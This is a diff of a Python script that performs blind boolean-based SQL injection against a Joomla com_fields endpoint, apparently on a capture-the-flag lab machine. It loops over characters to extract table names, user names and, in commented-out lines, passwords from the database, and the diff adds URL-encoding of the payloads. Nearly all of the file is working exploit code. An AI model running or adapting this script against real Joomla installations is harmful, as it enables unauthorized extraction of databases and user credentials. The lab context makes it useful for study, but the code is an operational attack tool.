@@ -1,6 +1,6 @@
 import os
 import requests
-
+import urllib.parse
 import sys
 
 # info: https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
@@ -16,7 +16,7 @@ proxies = {"http":"http://127.0.0.1:8080"}
 print("running...")
 print()
 
-target = "http://10.10.180.67/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"
+target = "http://10.10.154.87/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"
 t2 = target.replace("1573=1573", "1573=1572")
 tested = False
 condition = "1573=1573"
@@ -44,6 +44,8 @@ chars.remove(32)
 #123 - 127
 
 def check(st):
+    #r = requests.get(st, allow_redirects=False)
+    #print(st)
     r = requests.get(st, proxies=proxies, allow_redirects=False)
     #print(len(r.text))
 
@@ -93,26 +95,23 @@ for j in range(1, 175): # word number
             # AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)--
 
             #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema LIKE 'joomla' LIMIT {},1),{},1)=char({})".format(j, i, char)
-            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='joomla' LIMIT {},1),{},1)=char({})".format(j, i, char)
+            
             #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = concat(char(106)char(111)char(111)char(109)char(108)char(97)) LIMIT {},1),{},1)=char({})".format(j, i, char)
             #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = concat(char(74)char(79)char(79)char(77)char(76)char(65)) LIMIT {},1),{},1)=char({})".format(j, i, char)
             #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = concat(char(74)char(111)char(111)char(109)char(108)char(97)) LIMIT {},1),{},1)=char({})".format(j, i, char)
-            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='JOOMLA' LIMIT {},1),{},1)=char({})".format(j, i, char)
+            #test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='joomla' LIMIT {},1),{},1)=char({})".format(j, i, char)
+
+
+            test = "SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema= joomla LIMIT {},1),{},1)=char({})".format(j, i, char)
 
             # GET COLUMN NAMES
-            
-
-            
             #test = "SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = concat(char(117),char(115),char(101),char(114)) LIMIT {},1),{},1)=char({})".format(j, i, char)
             
                 
 
             # GET VALUE
             #query = "http://10.10.180.67/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)   
-
-            test = "SUBSTRING((SELECT name FROM #__users LIMIT {},1),{},1)=char({})".format(j, i, char)     
-
-
+            #test = "SUBSTRING((SELECT name FROM #__users LIMIT {},1),{},1)=char({})".format(j, i, char)     
 
 
 
@@ -120,12 +119,11 @@ for j in range(1, 175): # word number
             # http://10.10.180.67/s3cret_manag3r_pag3.php?name=' OR IF(EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'flag_table'),"OK","NO")='OK
 
 
-
-
-
-
             #print(query)
+            test = urllib.parse.quote(test)
             query = target.replace(condition, test)
+            
+            #query = f"{urllib.parse.quote(query)}"
             if check(query):
                 print(char)
                 tmp += str(chr(char))
